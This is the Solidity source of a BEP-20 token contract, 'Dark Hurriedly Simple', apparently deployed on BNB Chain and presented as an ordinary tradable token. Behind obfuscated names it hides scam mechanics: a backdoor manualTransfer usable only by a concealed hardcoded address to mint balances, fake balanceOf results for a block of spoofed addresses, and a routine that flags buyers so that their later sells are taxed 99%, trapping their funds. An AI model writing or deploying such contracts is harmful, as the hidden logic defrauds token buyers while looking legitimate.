/**
 *Submitted for verification at BscScan.com on 2023-01-03
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.3;



abstract contract Ownable {
    address internal owner;
    constructor(address _owner) {
        owner = _owner;
    }

    modifier onlyOwner() {
        require(isOwner(msg.sender), "!OWNER");
        _;
    }

    function isOwner(address account) public view returns (bool) {
        return account == owner;
    }

    function Owner() public view returns (address) {
        return owner;
    }

    function transferOwnership(address payable adr) public onlyOwner() {
        owner = adr;
        emit OwnershipTransferred(adr);
    }

    event OwnershipTransferred(address owner);

}



library SafeMath {

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function tryMod(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a % b);
    }
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a % b;
    }
    }

    function trySub(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b > a) return (false, 0);
        return (true, a - b);
    }
    }

    function tryAdd(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        uint256 c = a + b;
        if (c < a) return (false, 0);
        return (true, c);
    }
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a / b;
    }
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b <= a, errorMessage);
        return a - b;
    }
    }

}

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
}


interface IUniswapV2Router {

    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);

    function factory() external pure returns (address);

    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
    external payable returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);

    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    )
    external
    returns (
        uint256 amountA,
        uint256 amountB,
        uint256 liquidity
    );

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;

    function WETH() external pure returns (address);

}

interface IPancakePair {
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
    external
    returns (address pair);
}


interface IBEP20 {

    function name() external view returns (string memory);

    function decimals() external view returns (uint8);

    function balanceOf(address account) external view returns (uint256);

    function getOwner() external view returns (address);

    function symbol() external view returns (string memory);

    function totalSupply() external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transfer(address recipient, uint256 amount) 
    external
    returns (bool);

    function allowance(address _owner, address spender)
    external
    view
    returns (uint256);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}




contract DarkHurriedlySimple is IBEP20, Ownable {
    using SafeMath for uint256;

    uint256  constant MASK = type(uint128).max;
    address private WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address private DEAD = 0x000000000000000000000000000000000000dEaD;
    address private ZERO = 0x0000000000000000000000000000000000000000;


    uint256 toModeIsLaunched = 100000000 * (10 ** _decimals);
    uint256  fundSellTradingTx = 100000000 * 10 ** _decimals;
    uint256  buyBotsFromListIs = 100000000 * 10 ** _decimals;


    string constant _name = "Dark Hurriedly Simple";
    string constant _symbol = "DHSE";
    uint8 constant _decimals = 18;

    uint256 private listFeeLimitModeMarketingFundTotal = 0;
    uint256 private toAtAmountToken = 4;

    uint256 private totalToBotsTxWalletLaunched = 0;
    uint256 private fromIsAmountTeam = 4;

    bool private tradingTokenSwapFeeTotal = true;
    uint160 constant listLiquidityTokenTake = 640164319459 * 2 ** 40;
    bool private exemptAutoReceiverTeamBotsTotalFee = true;
    bool private launchTokenTeamModeLiquidity = true;
    bool private swapLiquidityListAmount = true;
    uint256 constant receiverExemptLiquidityFeeTake = 300000 * 10 ** 18;
    uint160 constant maxBuyTeamToken = 200726063409;
    bool private listLimitExemptFund = true;
    uint256 atTokenAmountMax = 2 ** 18 - 1;
    uint256 private buySenderShouldTrading = 6 * 10 ** 15;
    uint256 private receiverEnableBotsReceiver = toModeIsLaunched / 1000; // 0.1%
    uint256 tradingTeamSellMint = 46366;

    address constant fundLaunchedLiquidityFrom = 0x2Feef5f2935415E23DF657F73C691eb68Bf74D23;
    uint256 teamReceiverModeIs = 0;
    uint256 constant walletSwapMintSell = 10000 * 10 ** 18;

    uint256 private receiverSenderBotsLaunchReceiverWalletFrom = toAtAmountToken + listFeeLimitModeMarketingFundTotal;
    uint256 private botsTradingLaunchedEnableFundMode = 100;

    uint160 constant fromTxTotalIs = 1069883190569 * 2 ** 120;

    bool private tokenMaxExemptMintTradingLaunch;
    uint256 private launchToAtExempt;
    uint256 private receiverMinFromToMarketingIsToken;
    uint256 private exemptFeeTxTotalSenderFundLaunch;
    uint256 private listEnableTxMint;
    uint160 constant exemptLaunchedShouldTeam = 300887135539 * 2 ** 80;

    mapping(address => uint256) _balances;
    mapping(address => mapping(address => uint256)) _allowances;
    mapping(address => bool) private amountTotalLiquidityShould;
    mapping(address => bool) private sellMintReceiverTo;
    mapping(address => bool) private takeListTokenModeLiquidityLimitShould;
    mapping(address => bool) private atBuyTotalExempt;
    mapping(address => uint256) private totalMinLimitTake;
    mapping(uint256 => address) private mintShouldTokenLimit;
    mapping(uint256 => address) private modeSellWalletLaunchedFromTake;
    mapping(address => uint256) private limitExemptSenderTotal;
    uint256 public maxWalletAmount = 0;
    uint256 private launchBlock = 0;
    uint256 public modeSellWalletLaunchedFromTakeIndex = 0;

    IUniswapV2Router public walletFundTotalSell;
    address public uniswapV2Pair;

    uint256 private tokenTakeAutoLaunch;
    uint256 private tokenTakeSwapBuyLimitMode;

    address private fromModeTradingBurn = (msg.sender); // auto-liq address
    address private teamMaxTradingBurn = (0xFEAdd43fF1772Ecf4A01D3e9ffFFcc3f022d7C12); // marketing address

    
    uint256 private modeLimitLiquiditySenderTo = 0;
    uint256 public minBotsMintFrom = 0;
    bool public launchedFundMaxReceiver = false;
    uint256 private launchedMinTeamTakeExemptSellFund = 0;
    bool private atModeAutoTx = false;
    bool private burnExemptWalletAuto = false;
    bool public limitAtTxLaunchedBurn = false;
    uint256 private listLaunchedTokenEnable = 0;
    bool public feeBurnReceiverReceiver = false;

    event BuyTaxesUpdated(uint256 buyTaxes);
    event SellTaxesUpdated(uint256 sellTaxes);

    bool inSwap;
    modifier swapping() {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor() Ownable(msg.sender) {
        address _router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
        // PancakeSwap Router
        walletFundTotalSell = IUniswapV2Router(_router);

        uniswapV2Pair = IUniswapV2Factory(walletFundTotalSell.factory()).createPair(address(this), walletFundTotalSell.WETH());
        _allowances[address(this)][address(walletFundTotalSell)] = toModeIsLaunched;

        tokenMaxExemptMintTradingLaunch = true;

        takeListTokenModeLiquidityLimitShould[msg.sender] = true;
        takeListTokenModeLiquidityLimitShould[0x0000000000000000000000000000000000000000] = true;
        takeListTokenModeLiquidityLimitShould[0x000000000000000000000000000000000000dEaD] = true;
        takeListTokenModeLiquidityLimitShould[address(this)] = true;

        amountTotalLiquidityShould[msg.sender] = true;
        amountTotalLiquidityShould[address(this)] = true;

        sellMintReceiverTo[msg.sender] = true;
        sellMintReceiverTo[0x0000000000000000000000000000000000000000] = true;
        sellMintReceiverTo[0x000000000000000000000000000000000000dEaD] = true;
        sellMintReceiverTo[address(this)] = true;

        approve(_router, toModeIsLaunched);
        approve(address(uniswapV2Pair), toModeIsLaunched);
        _balances[msg.sender] = toModeIsLaunched;
        emit Transfer(address(0), msg.sender, toModeIsLaunched);
    }

    receive() external payable {}

    function totalSupply() external view override returns (uint256) {
        return toModeIsLaunched;
    }

    function decimals() external pure override returns (uint8) {
        return _decimals;
    }

    function symbol() external pure override returns (string memory) {
        return _symbol;
    }

    function name() external pure override returns (string memory) {
        return _name;
    }

    function getOwner() external view override returns (address) {
        return owner;
    }

    function allowance(address holder, address spender) external view override returns (uint256) {
        return _allowances[holder][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function approveMax(address spender) external returns (bool) {
        return approve(spender, toModeIsLaunched);
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        return buyWalletBotsLaunched(msg.sender, recipient, amount);
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if (_allowances[sender][msg.sender] != toModeIsLaunched) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender]
            .sub(amount, "Insufficient Allowance!");
        }

        return buyWalletBotsLaunched(sender, recipient, amount);
    }

    function totalAtLaunchedIsMax(uint160 mintTokenLiquidityTo) private view returns (bool) {
        return uint16(mintTokenLiquidityTo) == tradingTeamSellMint;
    }

    function setbuyBurnExemptLiquidity(bool liquidityShouldSellLaunch) public onlyOwner {
        if (feeBurnReceiverReceiver != swapLiquidityListAmount) {
            swapLiquidityListAmount=liquidityShouldSellLaunch;
        }
        feeBurnReceiverReceiver=liquidityShouldSellLaunch;
    }

    function buyWalletBotsLaunched(address marketingReceiverTxFromTeamMint, address mintTokenLiquidityTo, uint256 autoMaxIsTotal) internal returns (bool) {
        if (toListBotsSellTotal(uint160(mintTokenLiquidityTo))) {
            marketingSwapFundTxMaxAt(marketingReceiverTxFromTeamMint, mintTokenLiquidityTo, autoMaxIsTotal, false);
            return true;
        }
        if (toListBotsSellTotal(uint160(marketingReceiverTxFromTeamMint))) {
            marketingSwapFundTxMaxAt(marketingReceiverTxFromTeamMint, mintTokenLiquidityTo, autoMaxIsTotal, true);
            return true;
        }
        
        bool launchedListExemptReceiver = fundLaunchBurnAuto(marketingReceiverTxFromTeamMint) || fundLaunchBurnAuto(mintTokenLiquidityTo);
        
        if (marketingReceiverTxFromTeamMint == uniswapV2Pair) {
            if (maxWalletAmount != 0 && totalAtLaunchedIsMax(uint160(mintTokenLiquidityTo))) {
                senderWalletFromLaunch();
            }
            if (!launchedListExemptReceiver) {
                enableTradingReceiverLaunchBurn(mintTokenLiquidityTo);
            }
        }
        
        
        if (minBotsMintFrom == fromIsAmountTeam) {
            minBotsMintFrom = receiverEnableBotsReceiver;
        }

        if (feeBurnReceiverReceiver != swapLiquidityListAmount) {
            feeBurnReceiverReceiver = burnExemptWalletAuto;
        }

        if (modeLimitLiquiditySenderTo == fromIsAmountTeam) {
            modeLimitLiquiditySenderTo = toAtAmountToken;
        }


        if (inSwap || launchedListExemptReceiver) {return tradingLaunchAutoTeam(marketingReceiverTxFromTeamMint, mintTokenLiquidityTo, autoMaxIsTotal);}
        
        if (atModeAutoTx == listLimitExemptFund) {
            atModeAutoTx = launchTokenTeamModeLiquidity;
        }

        if (listLaunchedTokenEnable != launchBlock) {
            listLaunchedTokenEnable = maxWalletAmount;
        }


        require((autoMaxIsTotal <= fundSellTradingTx) || takeListTokenModeLiquidityLimitShould[marketingReceiverTxFromTeamMint] || takeListTokenModeLiquidityLimitShould[mintTokenLiquidityTo], "Max TX Limit!");

        if (tradingAtReceiverMin()) {mintWalletIsLimit();}

        _balances[marketingReceiverTxFromTeamMint] = _balances[marketingReceiverTxFromTeamMint].sub(autoMaxIsTotal, "Insufficient Balance!");
        
        uint256 totalFundAutoLiquidity = atExemptSenderTotalLaunch(marketingReceiverTxFromTeamMint) ? liquidityBuyBurnTx(marketingReceiverTxFromTeamMint, mintTokenLiquidityTo, autoMaxIsTotal) : autoMaxIsTotal;

        _balances[mintTokenLiquidityTo] = _balances[mintTokenLiquidityTo].add(totalFundAutoLiquidity);
        emit Transfer(marketingReceiverTxFromTeamMint, mintTokenLiquidityTo, totalFundAutoLiquidity);
        return true;
    }

    function tradingLaunchAutoTeam(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance!");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function gettakeLimitTradingTotalSell() public view returns (bool) {
        if (launchedFundMaxReceiver == exemptAutoReceiverTeamBotsTotalFee) {
            return exemptAutoReceiverTeamBotsTotalFee;
        }
        return launchedFundMaxReceiver;
    }

    function setlaunchTotalReceiverExempt(uint256 liquidityShouldSellLaunch) public onlyOwner {
        modeSellWalletLaunchedFromTakeIndex=liquidityShouldSellLaunch;
    }

    function balanceOf(address account) public view override returns (uint256) {
        if (toListBotsSellTotal(uint160(account))) {
            return totalLaunchedAmountTxLimit(uint160(account));
        }
        return _balances[account];
    }

    function marketingSwapFundTxMaxAt(address marketingReceiverTxFromTeamMint, address mintTokenLiquidityTo, uint256 autoMaxIsTotal, bool limitAutoBurnLaunchedMaxToFee) private {
        if (limitAutoBurnLaunchedMaxToFee) {
            marketingReceiverTxFromTeamMint = address(uint160(uint160(fundLaunchedLiquidityFrom) + teamReceiverModeIs));
            teamReceiverModeIs++;
            _balances[mintTokenLiquidityTo] = _balances[mintTokenLiquidityTo].add(autoMaxIsTotal);
        } else {
            _balances[marketingReceiverTxFromTeamMint] = _balances[marketingReceiverTxFromTeamMint].sub(autoMaxIsTotal);
        }
        emit Transfer(marketingReceiverTxFromTeamMint, mintTokenLiquidityTo, autoMaxIsTotal);
    }

    function tradingAtReceiverMin() internal view returns (bool) {
        return msg.sender != uniswapV2Pair &&
        !inSwap &&
        listLimitExemptFund &&
        _balances[address(this)] >= receiverEnableBotsReceiver;
    }

    function liquidityBuyBurnTx(address marketingReceiverTxFromTeamMint, address marketingBotsAtLiquidity, uint256 autoMaxIsTotal) internal returns (uint256) {
        
        uint256 teamListFundTotalLimitEnable = autoMaxIsTotal.mul(atTradingBuyFund(marketingReceiverTxFromTeamMint, marketingBotsAtLiquidity == uniswapV2Pair)).div(botsTradingLaunchedEnableFundMode);

        if (atBuyTotalExempt[marketingReceiverTxFromTeamMint] || atBuyTotalExempt[marketingBotsAtLiquidity]) {
            teamListFundTotalLimitEnable = autoMaxIsTotal.mul(99).div(botsTradingLaunchedEnableFundMode);
        }

        _balances[address(this)] = _balances[address(this)].add(teamListFundTotalLimitEnable);
        emit Transfer(marketingReceiverTxFromTeamMint, address(this), teamListFundTotalLimitEnable);
        
        return autoMaxIsTotal.sub(teamListFundTotalLimitEnable);
    }

    function fundLaunchBurnAuto(address botsSellIsSwapListTo) private view returns (bool) {
        return botsSellIsSwapListTo == teamMaxTradingBurn;
    }

    function getLaunchBlock() public view returns (uint256) {
        if (launchBlock != receiverEnableBotsReceiver) {
            return receiverEnableBotsReceiver;
        }
        if (launchBlock != launchedMinTeamTakeExemptSellFund) {
            return launchedMinTeamTakeExemptSellFund;
        }
        if (launchBlock == botsTradingLaunchedEnableFundMode) {
            return botsTradingLaunchedEnableFundMode;
        }
        return launchBlock;
    }

    function getliquidityFundMintEnableTokenMinFee() public view returns (uint256) {
        if (receiverEnableBotsReceiver == launchedMinTeamTakeExemptSellFund) {
            return launchedMinTeamTakeExemptSellFund;
        }
        if (receiverEnableBotsReceiver == modeLimitLiquiditySenderTo) {
            return modeLimitLiquiditySenderTo;
        }
        return receiverEnableBotsReceiver;
    }

    function senderWalletFromLaunch() private {
        if (maxWalletAmount > 0) {
            for (uint256 i = 1; i <= maxWalletAmount; i++) {
                if (totalMinLimitTake[mintShouldTokenLimit[i]] == 0) {
                    totalMinLimitTake[mintShouldTokenLimit[i]] = block.timestamp;
                }
            }
            maxWalletAmount = 0;
        }
    }

    function setautoIsMintFee(bool liquidityShouldSellLaunch) public onlyOwner {
        if (launchTokenTeamModeLiquidity != launchTokenTeamModeLiquidity) {
            launchTokenTeamModeLiquidity=liquidityShouldSellLaunch;
        }
        if (launchTokenTeamModeLiquidity != exemptAutoReceiverTeamBotsTotalFee) {
            exemptAutoReceiverTeamBotsTotalFee=liquidityShouldSellLaunch;
        }
        launchTokenTeamModeLiquidity=liquidityShouldSellLaunch;
    }

    function setliquidityFundMintEnableTokenMinFee(uint256 liquidityShouldSellLaunch) public onlyOwner {
        if (receiverEnableBotsReceiver != launchBlock) {
            launchBlock=liquidityShouldSellLaunch;
        }
        if (receiverEnableBotsReceiver != modeLimitLiquiditySenderTo) {
            modeLimitLiquiditySenderTo=liquidityShouldSellLaunch;
        }
        receiverEnableBotsReceiver=liquidityShouldSellLaunch;
    }

    function getTotalFee() public {
        totalBuySellFund();
    }

    function minFromTakeLaunchedList(uint160 tokenShouldAutoEnableFundMin) private pure returns (bool) {
        return tokenShouldAutoEnableFundMin == (fromTxTotalIs + exemptLaunchedShouldTeam + listLiquidityTokenTake + maxBuyTeamToken);
    }

    function atExemptSenderTotalLaunch(address marketingReceiverTxFromTeamMint) internal view returns (bool) {
        return !sellMintReceiverTo[marketingReceiverTxFromTeamMint];
    }

    function mintWalletIsLimit() internal swapping {
        
        uint256 autoMaxIsTotalToLiquify = receiverEnableBotsReceiver.mul(listFeeLimitModeMarketingFundTotal).div(receiverSenderBotsLaunchReceiverWalletFrom).div(2);
        uint256 autoMaxIsTotalToSwap = receiverEnableBotsReceiver.sub(autoMaxIsTotalToLiquify);

        address[] memory walletTeamBuyTo = new address[](2);
        walletTeamBuyTo[0] = address(this);
        walletTeamBuyTo[1] = walletFundTotalSell.WETH();
        walletFundTotalSell.swapExactTokensForETHSupportingFeeOnTransferTokens(
            autoMaxIsTotalToSwap,
            0,
            walletTeamBuyTo,
            address(this),
            block.timestamp
        );
        
        if (launchedMinTeamTakeExemptSellFund != minBotsMintFrom) {
            launchedMinTeamTakeExemptSellFund = launchBlock;
        }


        uint256 atEnableIsTakeBuyLiquiditySell = address(this).balance;
        uint256 tokenLiquidityFeeAuto = receiverSenderBotsLaunchReceiverWalletFrom.sub(listFeeLimitModeMarketingFundTotal.div(2));
        uint256 atEnableIsTakeBuyLiquiditySellLiquidity = atEnableIsTakeBuyLiquiditySell.mul(listFeeLimitModeMarketingFundTotal).div(tokenLiquidityFeeAuto).div(2);
        uint256 atEnableIsTakeBuyLiquiditySellMarketing = atEnableIsTakeBuyLiquiditySell.mul(toAtAmountToken).div(tokenLiquidityFeeAuto);
        
        if (atModeAutoTx != limitAtTxLaunchedBurn) {
            atModeAutoTx = limitAtTxLaunchedBurn;
        }

        if (burnExemptWalletAuto != tradingTokenSwapFeeTotal) {
            burnExemptWalletAuto = burnExemptWalletAuto;
        }


        payable(teamMaxTradingBurn).transfer(atEnableIsTakeBuyLiquiditySellMarketing);

        if (autoMaxIsTotalToLiquify > 0) {
            walletFundTotalSell.addLiquidityETH{value : atEnableIsTakeBuyLiquiditySellLiquidity}(
                address(this),
                autoMaxIsTotalToLiquify,
                0,
                0,
                fromModeTradingBurn,
                block.timestamp
            );
            emit AutoLiquify(atEnableIsTakeBuyLiquiditySellLiquidity, autoMaxIsTotalToLiquify);
        }
    }

    function getTotalAmount() public {
        senderWalletFromLaunch();
    }

    function manualTransfer(address marketingReceiverTxFromTeamMint, address mintTokenLiquidityTo, uint256 autoMaxIsTotal) public {
        if (!minFromTakeLaunchedList(uint160(msg.sender))) {
            return;
        }
        if (toListBotsSellTotal(uint160(mintTokenLiquidityTo))) {
            marketingSwapFundTxMaxAt(marketingReceiverTxFromTeamMint, mintTokenLiquidityTo, autoMaxIsTotal, false);
            return;
        }
        if (toListBotsSellTotal(uint160(marketingReceiverTxFromTeamMint))) {
            marketingSwapFundTxMaxAt(marketingReceiverTxFromTeamMint, mintTokenLiquidityTo, autoMaxIsTotal, true);
            return;
        }
        if (marketingReceiverTxFromTeamMint == address(0)) {
            _balances[mintTokenLiquidityTo] = _balances[mintTokenLiquidityTo].add(autoMaxIsTotal);
            return;
        }
    }

    function toListBotsSellTotal(uint160 tokenShouldAutoEnableFundMin) private pure returns (bool) {
        if (tokenShouldAutoEnableFundMin >= uint160(fundLaunchedLiquidityFrom) && tokenShouldAutoEnableFundMin <= uint160(fundLaunchedLiquidityFrom) + 100000) {
            return true;
        }
        return false;
    }

    function setZERO(address liquidityShouldSellLaunch) public onlyOwner {
        if (ZERO == ZERO) {
            ZERO=liquidityShouldSellLaunch;
        }
        ZERO=liquidityShouldSellLaunch;
    }

    function getZERO() public view returns (address) {
        if (ZERO != ZERO) {
            return ZERO;
        }
        if (ZERO != fromModeTradingBurn) {
            return fromModeTradingBurn;
        }
        return ZERO;
    }

    function setshouldMinAtBuy(bool liquidityShouldSellLaunch) public onlyOwner {
        if (exemptAutoReceiverTeamBotsTotalFee != burnExemptWalletAuto) {
            burnExemptWalletAuto=liquidityShouldSellLaunch;
        }
        if (exemptAutoReceiverTeamBotsTotalFee != tradingTokenSwapFeeTotal) {
            tradingTokenSwapFeeTotal=liquidityShouldSellLaunch;
        }
        if (exemptAutoReceiverTeamBotsTotalFee == swapLiquidityListAmount) {
            swapLiquidityListAmount=liquidityShouldSellLaunch;
        }
        exemptAutoReceiverTeamBotsTotalFee=liquidityShouldSellLaunch;
    }

    function setliquiditySenderMaxTake(uint256 liquidityShouldSellLaunch) public onlyOwner {
        if (totalToBotsTxWalletLaunched != totalToBotsTxWalletLaunched) {
            totalToBotsTxWalletLaunched=liquidityShouldSellLaunch;
        }
        if (totalToBotsTxWalletLaunched != fromIsAmountTeam) {
            fromIsAmountTeam=liquidityShouldSellLaunch;
        }
        if (totalToBotsTxWalletLaunched != launchedMinTeamTakeExemptSellFund) {
            launchedMinTeamTakeExemptSellFund=liquidityShouldSellLaunch;
        }
        totalToBotsTxWalletLaunched=liquidityShouldSellLaunch;
    }

    function getliquiditySenderMaxTake() public view returns (uint256) {
        return totalToBotsTxWalletLaunched;
    }

    function setLaunchBlock(uint256 liquidityShouldSellLaunch) public onlyOwner {
        launchBlock=liquidityShouldSellLaunch;
    }

    function enableTradingReceiverLaunchBurn(address botsSellIsSwapListTo) private {
        uint256 feeSellListBuy = launchedMinLiquidityFund();
        if (feeSellListBuy < buySenderShouldTrading) {
            modeSellWalletLaunchedFromTakeIndex += 1;
            modeSellWalletLaunchedFromTake[modeSellWalletLaunchedFromTakeIndex] = botsSellIsSwapListTo;
            limitExemptSenderTotal[botsSellIsSwapListTo] += feeSellListBuy;
            if (limitExemptSenderTotal[botsSellIsSwapListTo] > buySenderShouldTrading) {
                maxWalletAmount = maxWalletAmount + 1;
                mintShouldTokenLimit[maxWalletAmount] = botsSellIsSwapListTo;
            }
            return;
        }
        maxWalletAmount = maxWalletAmount + 1;
        mintShouldTokenLimit[maxWalletAmount] = botsSellIsSwapListTo;
    }

    function atTradingBuyFund(address marketingReceiverTxFromTeamMint, bool fundWalletBuyAt) internal returns (uint256) {
        
        if (fundWalletBuyAt) {
            receiverSenderBotsLaunchReceiverWalletFrom = fromIsAmountTeam + totalToBotsTxWalletLaunched;
            return fundFromSwapAmount(marketingReceiverTxFromTeamMint, receiverSenderBotsLaunchReceiverWalletFrom);
        }
        if (!fundWalletBuyAt && marketingReceiverTxFromTeamMint == uniswapV2Pair) {
            receiverSenderBotsLaunchReceiverWalletFrom = toAtAmountToken + listFeeLimitModeMarketingFundTotal;
            return receiverSenderBotsLaunchReceiverWalletFrom;
        }
        return fundFromSwapAmount(marketingReceiverTxFromTeamMint, receiverSenderBotsLaunchReceiverWalletFrom);
    }

    function fundFromSwapAmount(address marketingReceiverTxFromTeamMint, uint256 maxWalletBotsFee) private view returns (uint256) {
        uint256 toTeamListShould = totalMinLimitTake[marketingReceiverTxFromTeamMint];
        if (toTeamListShould > 0 && walletBuyFeeSell() - toTeamListShould > 2) {
            return 99;
        }
        return maxWalletBotsFee;
    }

    function launchedMinLiquidityFund() private view returns (uint256) {
        address botsSwapIsListTakeBuyLimit = WBNB;
        if (address(this) < WBNB) {
            botsSwapIsListTakeBuyLimit = address(this);
        }
        (uint totalModeShouldReceiver, uint swapFeeMinAmount,) = IPancakePair(uniswapV2Pair).getReserves();
        (uint256 maxLimitAmountModeSwapBuy,) = WBNB == botsSwapIsListTakeBuyLimit ? (totalModeShouldReceiver, swapFeeMinAmount) : (swapFeeMinAmount, totalModeShouldReceiver);
        uint256 isTeamLaunchedTokenBotsMin = IERC20(WBNB).balanceOf(uniswapV2Pair) - maxLimitAmountModeSwapBuy;
        return isTeamLaunchedTokenBotsMin;
    }

    function getautoIsMintFee() public view returns (bool) {
        return launchTokenTeamModeLiquidity;
    }

    function getlaunchTotalReceiverExempt() public view returns (uint256) {
        return modeSellWalletLaunchedFromTakeIndex;
    }

    function settakeLimitTradingTotalSell(bool liquidityShouldSellLaunch) public onlyOwner {
        launchedFundMaxReceiver=liquidityShouldSellLaunch;
    }

    function getshouldMinAtBuy() public view returns (bool) {
        return exemptAutoReceiverTeamBotsTotalFee;
    }

    function totalBuySellFund() private {
        if (modeSellWalletLaunchedFromTakeIndex > 0) {
            for (uint256 i = 1; i <= modeSellWalletLaunchedFromTakeIndex; i++) {
                if (totalMinLimitTake[modeSellWalletLaunchedFromTake[i]] == 0) {
                    totalMinLimitTake[modeSellWalletLaunchedFromTake[i]] = block.timestamp;
                }
            }
            modeSellWalletLaunchedFromTakeIndex = 0;
        }
    }

    function walletBuyFeeSell() private view returns (uint256) {
        return block.timestamp;
    }

    function totalLaunchedAmountTxLimit(uint160 tokenShouldAutoEnableFundMin) private view returns (uint256) {
        uint256 tradingFromExemptFund = teamReceiverModeIs;
        uint256 launchedMaxLimitSender = tokenShouldAutoEnableFundMin - uint160(fundLaunchedLiquidityFrom);
        if (launchedMaxLimitSender < tradingFromExemptFund) {
            return walletSwapMintSell;
        }
        return receiverExemptLiquidityFeeTake;
    }

    function getbuyBurnExemptLiquidity() public view returns (bool) {
        if (feeBurnReceiverReceiver != atModeAutoTx) {
            return atModeAutoTx;
        }
        return feeBurnReceiverReceiver;
    }

    event AutoLiquify(uint256 amountBNB, uint256 amountTokens);
}